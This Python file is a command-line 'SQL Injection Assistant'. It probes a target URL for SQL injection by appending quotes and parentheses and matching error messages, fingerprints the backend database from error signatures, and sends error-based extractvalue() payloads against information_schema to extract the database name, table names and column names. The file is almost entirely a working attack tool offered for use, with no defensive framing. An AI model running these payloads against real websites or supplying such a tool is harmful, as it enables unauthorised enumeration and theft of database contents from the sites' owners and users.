import requests
import argparse
from bs4 import BeautifulSoup as BS

def Main(test, get_database_type, dbname, tablenames, dump, columns, colum_name):
    if test:
        urls = [
            test + "'", test + '"', test[:-4] + ';', test + ")", test + "')", test + '")', test + '*'
        ] 
        vulnerable_text = [
            'MySQL Query fail:', '/www/htdocs/', 'Query failed', 'mysqli_fetch_array()', 'mysqli_result',
            'Warning: ', 'MySQL server', 'SQL syntax', 'You have an error in your SQL syntax;',
            'mssql_query()', "Incorrect syntax near '='", 'mssql_num_rows()', 'Notice: '
        ]
        vulnerable = False
        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                for vuln in vulnerable_text:
                    if vuln in data:
                        vulnerable = True
                        break
            if vulnerable:
                print('Site is vulnerable!')
            else:
                print('Site is not vulnerable!')
        except:
            print('Site is not vulnerable!')
    elif dump:
        print('Dumping the database')
    elif tablenames:
        print("Extracting tables names...")
        link = f"{tablenames} and extractvalue(1,(select group_concat(table_name) from information_schema.tables where table_schema=database()))"
        results = requests.get(link)
        data = results.text 
        str_num = data.find('error: ')
        str1 = data[str_num + 8:]
        str2 = str1.find('\'')
        str3 = str1[:str2]
        print(f"\nTable names: {str3}")
    elif columns:
        print('Extracting Columns...')
        link = f"{columns} and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='{colum_name}' limit 0,1)))--"
        results = requests.get(link)
        data = results.text
        print(f"Column names: {data}")
    elif dbname:
        link = f"{dbname} and extractvalue(1,concat(1,(select database()))) --"
        results = requests.get(link)
        data = results.text 
        str_num = data.find('error:')
        if str_num == -1:
            print('Access Denied')
        else:
            str1 = data[str_num + 7:]
            str2 = str1.find('\'')
            str3 = str1[:str2]
            print(f"Database name: {str3}")
    elif get_database_type:
        urls = [
            get_database_type + "'", get_database_type + '"', get_database_type[:-4] + ';',
            get_database_type + ")", get_database_type + "')", get_database_type + '")',
            get_database_type + '*'
        ]
        DBDict = {
            "MySQL": [
                'MySQL', 'MySQL Query fail:', 'SQL syntax', 'You have an error in your SQL syntax',
                'mssql_query()', 'mssql_num_rows()', '1064 You have an error in your SQL syntax'
            ],
            "PostGre": [
                'PostgreSQL query failed', 'Query failed', 'syntax error', 'unterminated quoted string',
                'unterminated dollar-quoted string', 'column not found', 'relation not found', 'function not found'
            ],
            "Microsoft_SQL": [
                'Microsoft SQL Server', 'Invalid object name', 'Unclosed quotation mark',
                'Incorrect syntax near', 'SQL Server error', 'The data types ntext and nvarchar are incompatible'
            ],
            "Oracle": [
                'ORA-', 'Oracle error', 'PLS-', 'invalid identifier', 'missing expression',
                'missing keyword', 'missing right parenthesis', 'not a valid month'
            ],
            "Advantage_Database": [
                'AdsCommandException', 'AdsConnectionException', 'AdsException', 'AdsExtendedReader',
                'AdsDataReader', 'AdsError'
            ],
            "Firebird": [
                'Dynamic SQL Error', 'SQL error code', 'arithmetic exception', 'numeric value is out of range',
                'malformed string', 'Invalid token'
            ]
        }
        DBFound = False
        try:
            for url in urls:
                results = requests.get(url)
                data = results.text
                for db, identifiers in DBDict.items():
                    if any(dbid in data for dbid in identifiers):
                        print(f"Database type: {db}")
                        DBFound = True
                        break
                if DBFound:
                    break
            if not DBFound:
                print('Database type: Unknown')
        except:
            print('Database type: Unknown')
    else:
        print('Invalid Argument given!')

if __name__ == '__main__':
    ap = argparse.ArgumentParser(prog='sql.py', usage='%(prog)s [options] -t <Target to test for SQLI Vulnerabilities>', description='SQL Injection Assistant')
    ap.add_argument('-t', '--test', type=str, help='Test Target for SQLI Vulnerabilities')
    ap.add_argument('-gdt', '--get_database_type', type=str, help='Find backend DB type')
    ap.add_argument('-dbn', '--dbname', type=str, help='Get database name')
    ap.add_argument('-tn', '--tablenames', type=str, help='Get table names')
    ap.add_argument('-c', '--columns', type=str, help="Get Column names")
    ap.add_argument('-cn', '--colum_name', type=str, help='Column Name')
    ap.add_argument('-d', '--dump', type=str, help="Dump the Database")
    args = ap.parse_args()
    
    Main(
        args.test, args.get_database_type, args.dbname, args.tablenames,
        args.dump, args.columns, args.colum_name
    )
